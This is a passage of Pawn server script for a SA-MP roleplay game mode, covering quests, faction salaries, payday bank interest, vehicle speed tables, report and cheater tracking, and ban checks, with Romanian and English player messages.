    mysql_format(SQL, gString, sizeof gString, "update `users` set `Quest` = '%d %d %d', `QuestProgress` = '%d %d %d', `QuestNeed` = '%d %d %d' where `id` = '%d';", PlayerInfo[playerid][pQuest][0], PlayerInfo[playerid][pQuest][1], PlayerInfo[playerid][pQuest][2], PlayerInfo[playerid][pQuestProgress][0], PlayerInfo[playerid][pQuestProgress][1], PlayerInfo[playerid][pQuestProgress][2], PlayerInfo[playerid][pQuestNeed][0], PlayerInfo[playerid][pQuestNeed][1], PlayerInfo[playerid][pQuestNeed][2], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    if(PlayerInfo[playerid][pQuestProgress][quest_slot] == PlayerInfo[playerid][pQuestNeed][quest_slot])
    {
        format(gString, sizeof gString, GetQuestName(playerid, questid), PlayerInfo[playerid][pQuestNeed][quest_slot]);

        format(gString, sizeof gString, (PlayerInfo[playerid][pLanguage] == 1 ? ("Quest [%s] completed!") : ("Misiunea [%s] a fost terminata!")), gString);
        SCM(playerid, COLOR_YELLOW, gString);

        new
            pp = RandomEx(1, 2), money = RandomEx(15000, 30000);

        GivePlayerCash(playerid, money);

        format(gString, sizeof gString, (PlayerInfo[playerid][pLanguage] == 1 ? ("You received a respect point, %d crystals and $%s.") : ("Ai primit un respect point, %d puncte premium si $%s.")), pp, FormatNumber(money));
        SCM(playerid, COLOR_YELLOW, gString);
        return 1;
    }

    format(gString, sizeof gString, GetQuestName(playerid, questid), PlayerInfo[playerid][pQuestNeed][quest_slot]);

    format(gString, sizeof gString, (PlayerInfo[playerid][pLanguage] == 1 ? ("Quest [%s] progress: %d/%d") : ("Progres pentru misiunea [%s]: %d/%d")), gString, PlayerInfo[playerid][pQuestProgress][quest_slot], PlayerInfo[playerid][pQuestNeed][quest_slot]);
    SCM(playerid, COLOR_YELLOW, gString);
    return 1;
}

stock HavePlayerCheckpoint(playerid)
{
	return s_PlayerInfo[playerid][pSCP] ? (1) : (0);
}

stock GetPlayerID(const playername[])
{
  	foreach(new i : Player)
  	{
  		new
  			playerName[MAX_PLAYER_NAME];

  		GetPlayerName(i, playerName, sizeof(playerName));
  		
  		if(strcmp(playerName, playername, true, strlen(playername)) == 0)
    		return i;
  	}
  	return INVALID_PLAYER_ID;
}

stock IsPlayerInRangeOfPlayer(playerid, targetId, Float: radius) {

	new
		Float: playerPos[3];

	GetPlayerPos(targetId, playerPos[0], playerPos[1], playerPos[2]);
	return IsPlayerInRangeOfPoint(playerid, radius, playerPos[0], playerPos[1], playerPos[2]);
}

stock IsACop(playerid)
{
	return factionType[PlayerInfo[playerid][pMember]] == FACTION_TYPE_POLICE ? (1) : (0);
}

stock GetFactionRankName(playerid)
{
	new
		rankName[32];

	new
		factionId = PlayerInfo[playerid][pMember];

	switch(PlayerInfo[playerid][pRank])
	{
		case 1: format(rankName, 32, DynamicFactions[factionId][fRankName1]);
		case 2: format(rankName, 32, DynamicFactions[factionId][fRankName2]);
		case 3: format(rankName, 32, DynamicFactions[factionId][fRankName3]);
		case 4: format(rankName, 32, DynamicFactions[factionId][fRankName4]);
		case 5: format(rankName, 32, DynamicFactions[factionId][fRankName5]);
		case 6: format(rankName, 32, DynamicFactions[factionId][fRankName6]);
		case 7: format(rankName, 32, DynamicFactions[factionId][fRankName7]);
	}
	return rankName;
}

stock NumeFactiune(factionId)
{
    new
        factionName[32];

	format(factionName, sizeof factionName, DynamicFactions[factionId][fName]);
    return factionName;
}

stock GetWeaponNameID(id)
{
    new
        weapString[24];

    format(weapString, sizeof weapString, "%s", GunNames[id]);
    return weapString;
}

stock Float:GetDistanceBetweenPlayers(playerid, id)
{
    new Float:x, Float:y, Float:z, Float:xx, Float:yy, Float:zz;
    if(!IsPlayerConnected(playerid) && !IsPlayerConnected(id))
        return -1.00;

    GetPlayerPos(playerid, x, y, z);
    GetPlayerPos(id, xx, yy, zz);
    return floatsqroot(floatpower(floatabs(floatsub(x, xx)), 2) + floatpower(floatabs(floatsub( y, yy )), 2) + floatpower(floatabs(floatsub(z, zz)), 2));
}

stock GetWeaponSlot(weaponid)
{
    switch (weaponid)
    {
        case 0, 1: return 0;
        case 2 .. 9: return 1;
        case 10 .. 15: return 10;
        case 16 .. 19, 39: return 8;
        case 22 .. 24: return 2;
        case 25 .. 27: return 3;
        case 28, 29, 32: return 4;
        case 30, 31: return 5;
        case 33, 34: return 6;
        case 35 .. 38: return 7;
        case 40: return 12;
        case 41 .. 43: return 9;
        case 44 .. 46: return 11;
    }
    return 0;
}

stock GivePlayerWeaponEx(playerid,weapon,ammo)
{
    s_PlayerInfo[playerid][pSWeaponData][GetWeaponSlot(weapon)] = true;
    return GivePlayerWeapon(playerid,weapon,ammo);
}

stock ResetPlayerWeaponsEx(playerid)
{
	for(new i; i < 13; ++i)
		s_PlayerInfo[playerid][pSWeaponData][i] = false;

    return ResetPlayerWeapons(playerid);
}

stock GetWeaponNameEx(id, const name[], len) return format(name, len, "%s", GunNames[id]);

stock onCheaterReported(reportID, cheaterID = -1, const text[], time, autoassign)
{
    if(!IsPlayerConnected(reportID))
        return 1;

    if(!autoassign)
    {
        if(!Iter_Contains(Cheaters, cheaterID)) Iter_Add(Cheaters, cheaterID);

        SetPVarInt(cheaterID, "cheater_report_time", time);
        SetPVarInt(cheaterID, "reported_by_player", reportID);
        SetPVarString(cheaterID, "cheater_report_reason", text);

        SetPVarInt(cheaterID, "cheater_score", GetPVarInt(cheaterID, "cheater_score") + 1);
    }

    SetPVarInt(reportID, "cheats_report_delay", 240);
    return 1;
}

stock onPlayerReportSent(reportID, reportPlayer = -1, type, time, delay, autoassign = 0)
{
    if(!IsPlayerConnected(reportID))
        return 1;

    if(!autoassign)
    {
        Iter_Add(sendReport, reportID);

        SetPVarInt(reportID, "report_type", type);
        SetPVarInt(reportID, "report_time", time);

        if(type == REPORT_TYPE_DM && reportPlayer)
        {
            SetPVarInt(reportID, "report_player", reportPlayer),
            SetPVarInt(reportPlayer, "reported_for", type), SetPVarInt(reportPlayer, "reported_by", reportID);
        }
    }
    mysql_format(SQL, gString, sizeof gString, "update `users` set `report_delay` = '%d' where `id` = '%d';", delay, PlayerInfo[reportID][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    if(delay)
        SetPVarInt(reportID, "report_delay", delay + gettime());
    
    return 1;
}

stock updateCheaterVariables(cheaterID)
{
    if(!Iter_Contains(Cheaters, cheaterID))
        return 1;

    DeletePVar(cheaterID, "cheater_report_time");
    DeletePVar(cheaterID, "reported_by_player");
    DeletePVar(cheaterID, "cheater_report_reason");

    DeletePVar(cheaterID, "cheater_score");

    Iter_Remove(Cheaters, cheaterID);

    return 1;
}

stock updateReportVariables(reportID, delayend = 0)
{
    if(Iter_Contains(sendReport, reportID))
    {
        new reportPlayer = GetPVarInt(reportID, "report_player");
        if(reportPlayer)
        {
            DeletePVar(reportPlayer, "reported_for");
            DeletePVar(reportPlayer, "reported_by");
            DeletePVar(reportID, "report_player");
        }

        DeletePVar(reportID, "report_time");
        DeletePVar(reportID, "report_type");
        DeletePVar(reportID, "report_reason");

        if(!GetPVarInt(reportID, "o_report_type"))
            Iter_Remove(sendReport, reportID);
    }
    if(delayend)
    {
        DeletePVar(reportID, "report_delay");

        mysql_format(SQL, gString, sizeof gString, "update `users` set `report_delay` = '0' where `id` = '%d';", PlayerInfo[reportID][pSQLID]);
        mysql_tquery(SQL, gString, "", "");
    }

    return 1;
}

stock Float:GetDistanceBetweenPoints(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2)
{
    return playerPosqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

stock GetVehicleMaxSpeed(model) {
    new speed;
    model -= 400;
    switch(model) {
        case 0: speed = 157; // model 400
        case 1: speed = 147; // model 401
        case 2: speed = 186; // model 402
        case 3: speed = 110; // model 403
        case 4: speed = 133; // model 404
        case 5: speed = 164; // model 405
        case 6: speed = 110; // model 406
        case 7: speed = 148; // model 407
        case 8: speed = 100;  // model 408
        case 9: speed = 158; // model 409
        case 10: speed = 129; // model 410
        case 11: speed = 221; // model 411
        case 12: speed = 168; // model 412
        case 13: speed = 110; // model 413
        case 14: speed = 105; // model 414
        case 15: speed = 192; // model 415
        case 16: speed = 154; // model 416
        case 17: speed = 127; // model 417
        case 18: speed = 115; // model 418
        case 19: speed = 149; // model 419
        case 20: speed = 145; // model 420
        case 21: speed = 154; // model 421
        case 22: speed = 140; // model 422
        case 23: speed = 99;  // model 423
        case 24: speed = 135; // model 424
        case 25: speed = 191; // model 425
        case 26: speed = 173; // model 426
        case 27: speed = 165; // model 427
        case 28: speed = 157; // model 428
        case 29: speed = 201; // model 429
        case 30: speed = 100; // model 430
        case 31: speed = 130; // model 431
        case 32: speed = 94;  // model 432
        case 33: speed = 110; // model 433
        case 34: speed = 167; // model 434
        case 35: speed = 0;   // model 435
        case 36: speed = 149; // model 436
        case 37: speed = 158; // model 437
        case 38: speed = 142; // model 438
        case 39: speed = 168; // model 439
        case 40: speed = 136; // model 440
        case 41: speed = 75;  // model 441
        case 42: speed = 139; // model 442
        case 43: speed = 126; // model 443
        case 44: speed = 110; // model 444
        case 45: speed = 164; // model 445
        case 46: speed = 270; // model 446
        case 47: speed = 270; // model 447
        case 48: speed = 111; // model 448
        case 49: speed = 169; // model 449
        case 50: speed = 0;   // model 450
        case 51: speed = 193; // model 451
        case 52: speed = 270; // model 452
        case 53: speed = 270;  // model 453
        case 54: speed = 135; // model 454
        case 55: speed = 157; // model 455
        case 56: speed = 100; // model 456
        case 57: speed = 95;  // model 457
        case 58: speed = 157; // model 458
        case 59: speed = 136; // model 459
        case 60: speed = 270;   // model 460
        case 61: speed = 160; // model 461
        case 62: speed = 111; // model 462
        case 63: speed = 142; // model 463
        case 64: speed = 0;   // model 464
        case 65: speed = 0;   // model 465
        case 66: speed = 147; // model 466
        case 67: speed = 140; // model 467
        case 68: speed = 144; // model 468
        case 69: speed = 270;   // model 469
        case 70: speed = 157; // model 470
        case 71: speed = 110; // model 471
        case 72: speed = 0;   // model 472
        case 73: speed = 190;   // model 473
        case 74: speed = 149; // model 474
        case 75: speed = 173; // model 475
        case 76: speed = 270;   // model 476
        case 77: speed = 186; // model 477
        case 78: speed = 117; // model 478
        case 79: speed = 140; // model 479
        case 80: speed = 184; // model 480
        case 81: speed = 73;  // model 481
        case 82: speed = 156; // model 482
        case 83: speed = 122; // model 483
        case 84: speed = 0;   // model 484
        case 85: speed = 0;  // model 485
        case 86: speed = 64;  // model 486
        case 87: speed = 270;   // model 487
        case 88: speed = 270;   // model 488
        case 89: speed = 139; // model 489
        case 90: speed = 157; // model 490
        case 91: speed = 149; // model 491
        case 92: speed = 140; // model 492
        case 93: speed = 270;   // model 493
        case 94: speed = 214; // model 494
        case 95: speed = 176; // model 495
        case 96: speed = 162; // model 496
        case 97: speed = 270;   // model 497
        case 98: speed = 0; // model 498
        case 99: speed = 123; // model 499
        case 100: speed = 140; // model 500
        case 101: speed = 0;   // model 501
        case 102: speed = 216; // model 502
        case 103: speed = 216; // model 503
        case 104: speed = 173; // model 504
        case 105: speed = 139; // model 505
        case 106: speed = 149; // model 506
        case 107: speed = 166; // model 507
        case 108: speed = 108; // model 508
        case 109: speed = 120;  // model 509
        case 110: speed = 130;  // model 510
        case 111: speed = 0;   // model 511
        case 112: speed = 0;   // model 512
        case 113: speed = 270;   // model 513
        case 114: speed = 120; // model 514
        case 115: speed = 142; // model 515
        case 116: speed = 157; // model 516
        case 117: speed = 157; // model 517
        case 118: speed = 164; // model 518
        case 119: speed = 270;   // model 519
        case 120: speed = 270;   // model 520
        case 121: speed = 160; // model 521
        case 122: speed = 176; // model 522
        case 123: speed = 151; // model 523
        case 124: speed = 130; // model 524
        case 125: speed = 160; // model 525
        case 126: speed = 158; // model 526
        case 127: speed = 149; // model 527
        case 128: speed = 176; // model 528
        case 129: speed = 149; // model 529
        case 130: speed = 0;  // model 530
        case 131: speed = 70;  // model 531
        case 132: speed = 110; // model 532
        case 133: speed = 167; // model 533
        case 134: speed = 168; // model 534
        case 135: speed = 158; // model 535
        case 136: speed = 173; // model 536
        case 137: speed = 0;   // model 537
        case 138: speed = 0;   // model 538
        case 139: speed = 270;  // model 539
        case 140: speed = 149; // model 540
        case 141: speed = 203; // model 541
        case 142: speed = 164; // model 542
        case 143: speed = 151; // model 543
        case 144: speed = 148; // model 544
        case 145: speed = 147; // model 545
        case 146: speed = 149; // model 546
        case 147: speed = 142; // model 547
        case 148: speed = 270; // model 548
        case 149: speed = 153; // model 549
        case 150: speed = 145; // model 550
        case 151: speed = 157; // model 551
        case 152: speed = 0; // model 552
        case 153: speed = 0;   // model 553
        case 154: speed = 144; // model 554
        case 155: speed = 158; // model 555
        case 156: speed = 113; // model 556
        case 157: speed = 113; // model 557
        case 158: speed = 156; // model 558
        case 159: speed = 178; // model 559
        case 160: speed = 169; // model 560
        case 161: speed = 154; // model 561
        case 162: speed = 178; // model 562
        case 163: speed = 0;   // model 563
        case 164: speed = 145;  // model 564
        case 165: speed = 165; // model 565
        case 166: speed = 160; // model 566
        case 167: speed = 173; // model 567
        case 168: speed = 146; // model 568
        case 169: speed = 0;   // model 569
        case 170: speed = 0;   // model 570
        case 171: speed = 93;  // model 571
        case 172: speed = 60;  // model 572
        case 173: speed = 110; // model 573
        case 174: speed = 60;  // model 574
        case 175: speed = 158; // model 575
        case 176: speed = 158; // model 576  
        case 177: speed = 0;   // model 577
        case 178: speed = 130; // model 578
        case 179: speed = 158; // model 579
        case 180: speed = 153; // model 580
        case 181: speed = 151; // model 581
        case 182: speed = 136; // model 582
        case 183: speed = 85;  // model 583
        case 184: speed = 0;   // model 584
        case 185: speed = 153; // model 585
        case 186: speed = 142; // model 586
        case 187: speed = 165; // model 587
        case 188: speed = 108; // model 588
        case 189: speed = 162; // model 589
        case 190: speed = 0;   // model 590
        case 191: speed = 0;   // model 591
        case 192: speed = 0;   // model 592
        case 193: speed = 270;   // model 593
        case 194: speed = 0;  // model 594
        case 195: speed = 0;   // model 595
        case 196: speed = 175; // model 596
        case 197: speed = 175; // model 597
        case 198: speed = 175; // model 598
        case 199: speed = 157; // model 599
        case 200: speed = 151; // model 600
        case 201: speed = 110; // model 601
        case 202: speed = 169; // model 602
        case 203: speed = 171; // model 603
        case 204: speed = 147; // model 604
        case 205: speed = 151; // model 605
        case 206: speed = 0;   // model 606
        case 207: speed = 0;   // model 607
        case 208: speed = 0;   // model 608
        case 209: speed = 102; // model 609
        case 210: speed = 0;   // model 610
    }
    return speed;
}

stock CalculeazaTimp2(secunde)
{
    new time = secunde;
    time = time%3600;
    new minute = time/60;
    time = time%60;
    new secunde2 = time;
    new string[10];
    format(string,sizeof(string),"%02d:%02d",minute,secunde2);
    return string;
}

stock IsVehicleOccupied(vehicleid)
{
    foreach(new i : PlayersInVehicle)
    {
        if(IsPlayerInVehicle(i, vehicleid)) return 1;
    }
    return 0;
}

stock TSToDays( iTimeStamp )
{
    if( iTimeStamp <= 0 ) return 1;
    new days = 0, actualTimeStamp = gettime ( ) - iTimeStamp;
    days = ( actualTimeStamp / 86400 );
    return ( days == 0 ) ? ( 0 ) : ( days );
}

stock sendLongMessage(playerid , color , const message[])
{
    new len = strlen(message),
        _iL = len / MAX_CHARS_PER_LINE;

    if((len % MAX_CHARS_PER_LINE)) _iL++;
    new _Line[MAX_CHARS_PER_LINE + 5];

    new _:_i@Index;
    while(_i@Index < _iL)
    {
        if(_i@Index == 0)
            strmid(_Line, message, (_i@Index * MAX_CHARS_PER_LINE), (_i@Index * MAX_CHARS_PER_LINE) + MAX_CHARS_PER_LINE);
        else
            strmid(_Line, message, (_i@Index * MAX_CHARS_PER_LINE), (_i@Index * MAX_CHARS_PER_LINE) + MAX_CHARS_PER_LINE);

        #if defined FINAL_DOTS
        if(_iL > 1)
        {
            if(_i@Index == 0)
            {
                format(_Line, sizeof _Line, "%s ...", _Line);
            }
            else if(_i@Index > 0 && (_i@Index + 1) < _iL)
            {
                format(_Line, sizeof _Line, "... %s ...", _Line);
            }
            else
            {
                format(_Line, sizeof _Line, "... %s", _Line);
            }
        }
        #endif
        ////////////
        SCM(playerid, color, _Line);
        ///////////
        _i@Index++;
    }
    return 1;
}

stock SendSplitMessage(playerid, color, const final[])
{
    new len = strlen(final),
        _iL = len / EX_SPLITLENGTH;
    if( ( len % EX_SPLITLENGTH ) ) _iL++;
    new _Line[EX_SPLITLENGTH+5];
    new _:_i@Index;
    while( _i@Index < _iL )
    {
        if( _i@Index == 0 )
            strmid( _Line, final, ( _i@Index * EX_SPLITLENGTH ), ( _i@Index * EX_SPLITLENGTH ) + EX_SPLITLENGTH );
        else
            strmid( _Line, final, ( _i@Index * EX_SPLITLENGTH ), ( _i@Index * EX_SPLITLENGTH ) + EX_SPLITLENGTH );

        if( _iL > 1 )
        {
            if( _i@Index > 0 )
            {
                format( _Line, sizeof _Line, "... %s", _Line );
            }
        }
        SCM(playerid, color, _Line);
        _i@Index++;
    }
    return 1;
}

stock RandomEx(minim, max) return random(max+1-minim) + minim;

stock FormatNumber(iNum, const szChar[] = ".")
{
    new
        string[16]
    ;
    format(string, sizeof(string), "%d", iNum);

    for(new iLen = strlen(string) - 3; iLen > 0; iLen -= 3)
    {
        strins(string, szChar, iLen);
    }
    return string;
}

stock GetPlayerFPS(playerid)
{
	return s_PlayerInfo[playerid][pSFPS];
}

stock GetClosestVehicle(playerid, Float: lastd = 200.0, vehicle = -1, Float: x =0.0, Float: y = 0.0, Float: z = 0.0, Float: dist = 0.0)
{
	if(vehicle == INVALID_VEHICLE_ID)
		return -1;

    GetPlayerPos(playerid, x, y, z);
    foreach(new i : streamedVehicles[playerid])
    {
        if(GetPlayerPos(playerid, x, y, z) && (dist = GetVehicleDistanceFromPoint(i, x, y, z)) < lastd)
            lastd = dist, vehicle = i;
    }
    return vehicle;
}

forward stock _AddStaticVehicleEx(modelid, Float:spawn_x, Float:spawn_y, Float:spawn_z, Float:z_angle, color1, color2, respawn_delay, addsiren = 0, vehtype = VEH_TYPE_NONE);
stock _AddStaticVehicleEx(modelid, Float:spawn_x, Float:spawn_y, Float:spawn_z, Float:z_angle, color1, color2, respawn_delay, addsiren = 0, vehtype = VEH_TYPE_NONE)
{
	if(INVALID_VEHICLE_ID != (returnVehicle = AddStaticVehicleEx(modelid, spawn_x, spawn_y, spawn_z, z_angle, color1, color2, respawn_delay, bool:addsiren)))
	{
		Iter_Add(VehicleType<vehtype>, returnVehicle);
    	VehicleInfo[returnVehicle][vehType] = vehtype;

        VehicleInfo[returnVehicle][vehEngine] = 0;

    	if(IsABike(returnVehicle))
        {
            VehicleInfo[returnVehicle][vehEngine] = 1;
    		SetVehicleParamsEx(returnVehicle, VEHICLE_PARAMS_ON, 0, 0, 0, 0, 0, 0);
        }
	}
	return returnVehicle;
}

stock DestroyVehicleEx(vehicleid)
{   
    DestroyVehicle(vehicleid);
    return Iter_SafeRemove(VehicleType<VehicleInfo[vehicleid][vehType]>, vehicleid, vehicleid);
}

#if defined _ALS_AddStaticVehicleEx
    #undef AddStaticVehicleEx
#else
    #define _ALS_AddStaticVehicleEx
#endif
#define AddStaticVehicleEx _AddStaticVehicleEx

#if defined _ALS_CreateVehicle
    #undef CreateVehicle
#else
    #define _ALS_CreateVehicle
#endif
#define CreateVehicle _AddStaticVehicleEx

#if defined _ALS_DestroyVehicle
    #undef DestroyVehicle
#else
    #define _ALS_DestroyVehicle
#endif
#define DestroyVehicle DestroyVehicleEx

#include </systems/personal_vehicles.inc>
#include </systems/jobs_data.inc>
#include </systems/dealership.inc>
#include </systems/premium&vip.inc>
#include </systems/drivingschool.inc>
#include </systems/clans.inc>

stock PutPlayerInVehicleEx(playerid, vehicleid, seatid)
{
	s_PlayerInfo[playerid][pSVehEnterTime] += 221;
	PutPlayerInVehicle(playerid,vehicleid,seatid);
	return 1;
}

stock sendSyntax(playerid, const string[]) return SCMF(playerid, -1, "{990000}Usage: {FFFFFF}%s", string);

stock IsMail(const email[])
{
    new at_pos = strfind(email, "@", true) + 1;
    if(email[0] == '@' || at_pos == -1)
        return false;

    return 1;
} 

stock BanCheck(playerid, check = 1)
{
	if(check)
	{
        GameTextForPlayer(playerid, "~r~CHECKING BAN STATUS ~w~~h~...", 3500, 3);

        new
            playerIP[16];
        
        GetPlayerIp(playerid, playerIP, sizeof playerIP);

        mysql_format(SQL, gString, sizeof gString, "select * from `bans` where `PlayerName` = '%s' or `IP` = '%s';", GetName(playerid), playerIP);
        mysql_pquery(SQL, gString, "BanCheckStatus", "d", playerid);
	}
	else
	{
        mysql_format(SQL, gString, sizeof gString, "select * from `users` where `name` = '%s' limit 1;", GetName(playerid));
        mysql_pquery(SQL, gString, "PlayerLogin", "d", playerid);
	}
    return 1;
}

timer _Kick[500](playerid)
	return Kick(playerid);

stock KickEx(playerid)
{
	defer _Kick(playerid);
	return 1;
}

stock GetName(playerid)
{
	new
		_playerName[MAX_PLAYER_NAME];

	GetPlayerName(playerid, _playerName, MAX_PLAYER_NAME);
	return _playerName;
}

stock GetDBName(playerid)
{
	new
		_playerName[MAX_PLAYER_NAME];
	
	if(!s_PlayerInfo[playerid][pSLoggedIn])
	{
	    GetPlayerName(playerid, _playerName, sizeof _playerName);
	    return _playerName;
	}

	format(_playerName, sizeof _playerName, PlayerInfo[playerid][pNormalName]);
	return _playerName;
}

stock strmatch(const string1[], const string2[]) return !strcmp(string1, string2, true) ? (true) : (false);
YCMD:time(playerid, params[], help) {
    new hour, minute, second;
    gettime(hour, minute, second);
    SCMF(playerid, -1, "The current time is %d:%s%d (%d seconds).", hour, (minute < 10) ? ("0") : (""), minute, second);
    SCMF(playerid, -1, "Playing for %d seconds [%s].", PlayerInfo[playerid][pPayDay], CalculeazaTimp2(PlayerInfo[playerid][pPayDay]));
    if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_watch", 4.1, 0, 0, 0, 0, 0);
    return 1; }

YCMD:debugpayday(playerid, params[], help)
{
    check_owner

    PlayerInfo[playerid][pAccType] = 3;
    
    onPlayerGotPayday(playerid);
    return 1;
}
// ======== FUNCTIONS ========

function GiveFactionSalary(playerid) 
{
    if(PlayerInfo[playerid][pMember] == 0) 
        return 1;
    
    new
        salaryWithBonus = PlayerInfo[playerid][pAccType] >= 1 && PlayerInfo[playerid][pAccType] < 3 ? PlayerInfo[playerid][pRank] * 250000 + PlayerInfo[playerid][pRank] * 250000/2 : PlayerInfo[playerid][pAccType] == 3 ? PlayerInfo[playerid][pRank] * 500000 * 2 : PlayerInfo[playerid][pRank] * 250000;

    SCMF(playerid, COLOR_DCHAT, "Ai primit suma de %s$ deoarece faci parte din factiunea %s (rank %d).", FormatNumber(salaryWithBonus), NumeFactiune(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank]);

    GivePlayerCash(playerid, salaryWithBonus);

    return 1; 
}

function onPlayerGotPayday(playerid)
{
    new
        bankInterest, taxValue = PlayerInfo[playerid][pLevel] < 10 ? PlayerInfo[playerid][pLevel] * 1000 : PlayerInfo[playerid][pLevel] * 10000, paydayTime = (PlayerInfo[playerid][pAccType] != 3) ? (3600) : (2700),
        accountBonus = 0;

    if(PlayerInfo[playerid][pHouse] && !strmatch(PlayerInfo[playerid][pNormalName], HouseInfo[PlayerInfo[playerid][pHouse]][hOwnerName])) 
    {
        if(HouseInfo[PlayerInfo[playerid][pHouse]][hRent] > GetPlayerCash(playerid)) 
            PlayerInfo[playerid][pHouse] = 0; // update in baza la casa 
        else
        {
            HouseInfo[PlayerInfo[playerid][pHouse]][hSafe] += HouseInfo[PlayerInfo[playerid][pHouse]][hRent];
        
            taxValue += HouseInfo[PlayerInfo[playerid][pHouse]][hRent];

            SCMF(playerid, -1, "%d", taxValue);

            mysql_format(SQL, gString, sizeof gString, "update `houses` set `Safe` = '%d' where `ID` = '%d'", HouseInfo[PlayerInfo[playerid][pHouse]][hSafe], PlayerInfo[playerid][pHouse]);
            mysql_tquery(SQL, gString, "", "");
        }
    }

    if(PlayerInfo[playerid][pAccountLY])
        bankInterest = (PlayerInfo[playerid][pAccountLY] * 1000000) + (PlayerInfo[playerid][pAccount] / 1000);
    else
        bankInterest = PlayerInfo[playerid][pAccount] / 1000;

    accountBonus = (PlayerInfo[playerid][pAccType] == 3) ? bankInterest : (PlayerInfo[playerid][pAccType] == 2 && PlayerInfo[playerid][pAccType] == 1) ? bankInterest/2 : 0;

    // PLM SAMP ASTA E
    //if(bankInterest-taxValue + accountBonus >= 999999999 || bankInterest-taxValue + accountBonus < 0)
    //    bankInterest = 999999999;

    if(bankInterest-taxValue + accountBonus >= 999999999)
        bankInterest = 999999999;

    SCMF(playerid, -1, "Vei primi %s. BONUS: %d (%d%%)", FormatNumber(bankInterest-taxValue + accountBonus), accountBonus, 5);

    PlayerInfo[playerid][pAccount] += bankInterest-taxValue + accountBonus;

    if(PlayerInfo[playerid][pAccount] >= 999999999)
    {
        PlayerInfo[playerid][pAccount] -= 999999999;
        PlayerInfo[playerid][pAccountLY] ++;
    }

    SCM(playerid, COLOR_SERVER, "----------------------------------------------------------------------------");
    SCM(playerid, COLOR_WHITE, "Your paycheck has arrived; please visit the bank to withdraw your money.");

    SCMF(playerid, -1, "Ai primit %.2f ore jucate.(%d minute)", PlayerInfo[playerid][pPayDay] / 3600.0, floatround(PlayerInfo[playerid][pPayDay] / 60.0));

    PlayerInfo[playerid][pConnectTime] += PlayerInfo[playerid][pPayDay] / 3600.0;

    if(PlayerInfo[playerid][pRob] < 100)
        PlayerInfo[playerid][pRob] ++;
    else 
        SCM(playerid, COLOR_WHITE, "Nu ai primit niciun rob/free point pentru ca ai deja 100 rob/free points.");

    if(PlayerInfo[playerid][pPet]) 
    {
        PlayerInfo[playerid][pPetPoints] += PlayerInfo[playerid][pPayDay] > 1801 ? 10 : 5;

        SCMF(playerid, -1, "Ai primit %s$ drept recompensa pentru ca animalul tau de companie are level %d. (%s minute jucate).", FormatNumber(PlayerInfo[playerid][pPetLevel] * PlayerInfo[playerid][pPayDay] > 1801 ? 200000 : 100000), PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPayDay] > 1801 ? "30+" : "<30");

        GivePlayerCash(playerid, PlayerInfo[playerid][pPetLevel] * PlayerInfo[playerid][pPayDay] > 1801 ? 200000 : 100000); 
    }

    PlayerInfo[playerid][pGiftPoints] += PlayerInfo[playerid][pPayDay] > 1801 ? 200 : 100;
    SCMF(playerid, COLOR_DCHAT, "Ai primit %d gift points (motiv: payday %s).", PlayerInfo[playerid][pPayDay] > 1801 ? 200 : 100, PlayerInfo[playerid][pPayDay] > 1801 ? ("ACTIV") : ("INACTIV"));

    if(PlayerInfo[playerid][pCrateTime] == 0) 
    {
        PlayerInfo[playerid][pCrateTime] = 3; 
        PlayerInfo[playerid][pCrates][0] ++; 
        
        SCM(playerid, COLOR_WHITE, "You received one crate (3 paydays passed since last one you received).");
        SCMF(playerid, -1, "You received one silver crate (type </crates> to open it). Total crates: %d", PlayerInfo[playerid][pCrates][0] + PlayerInfo[playerid][pCrates][1] + PlayerInfo[playerid][pCrates][2]);
    }
    else {
        SCMF(playerid, -1, "You'll receive one silver crate in %d paydays.", PlayerInfo[playerid][pCrateTime]);
        
        PlayerInfo[playerid][pCrateTime] --;  
    }

    GiveFactionSalary(playerid);

    PlayerInfo[playerid][pExp] ++ ;

    if(!PlayerInfo[playerid][pHUD][4])
    {
        SCM(playerid, -1, "--");
        SCMF(playerid, -1, "Paycheck: $%s | Bank balance: $%s | Bank interest: $%s | Tax: $%s", FormatNumber(bankInterest+taxValue+accountBonus), GetPlayerBank(playerid), FormatNumber(bankInterest), FormatNumber(taxValue));
        SCMF(playerid, -1, "Rent: $%s | Total earnings: $%s ", FormatNumber(HouseInfo[PlayerInfo[playerid][pHouse]][hRent]), FormatNumber(bankInterest+accountBonus));
        SCM(playerid, -1, "--");
    }
    else
    {
        format(gString, sizeof gString, "BANK BALANCE: $%s~n~INTEREST: $%s~n~RENT: $%s", GetPlayerBank(playerid), FormatNumber(bankInterest), FormatNumber(HouseInfo[PlayerInfo[playerid][pHouse]][hRent]));
        PlayerTextDrawSetString(playerid, PayDayTD[playerid][3], gString); 

        PlayerTextDrawShow(playerid, PayDayTD[playerid][1]);
        PlayerTextDrawShow(playerid, PayDayTD[playerid][2]);
        PlayerTextDrawShow(playerid, PayDayTD[playerid][3]);
        
        SetTimerEx("hidePayDayTDs", 5000, false, "i", playerid);
    }

    if(PlayerInfo[playerid][pAccType] == 3)
        SCMF(playerid, 0xd4f542FF, "{909CE7}Golden Account:{d4f542} Bank Interest & Faction Salary (if exist) were increased by 100%%.");
    SCM(playerid, COLOR_SERVER, "----------------------------------------------------------------------------");


    PlayerInfo[playerid][pPaydayTime] = gettime() + paydayTime;

    // UPDATE ROB POINTS, UPDATE PET POINTS, UPDATE GIFT POINTS, CRATES, CRATE TIME, ORE

    Update(playerid, pConnectTimex);

    return 1;
}

function hidePayDayTDs(playerid)
{
    for(new i=1; i <= 3; ++i)
        PlayerTextDrawHide(playerid, PayDayTD[playerid][i]);

    return 1;
}
YCMD:testmoney(playerid, params[], help)
{
    check_owner

    if(sscanf(params, "s[32]", params[0]))
        return SCM(playerid, -1, "suntaxa /testmoney usma");



    new
        sellCarMoneySuffix = 0,
        sellCarMoneyPrefix = 0;

    CreateLocalLY(sellCarMoneyPrefix, sellCarMoneySuffix, params[0]);

    if(PlayerInfo[playerid][pAccountLY] < sellCarMoneyPrefix || PlayerInfo[playerid][pAccount] < sellCarMoneySuffix && !PlayerInfo[playerid][pAccountLY])
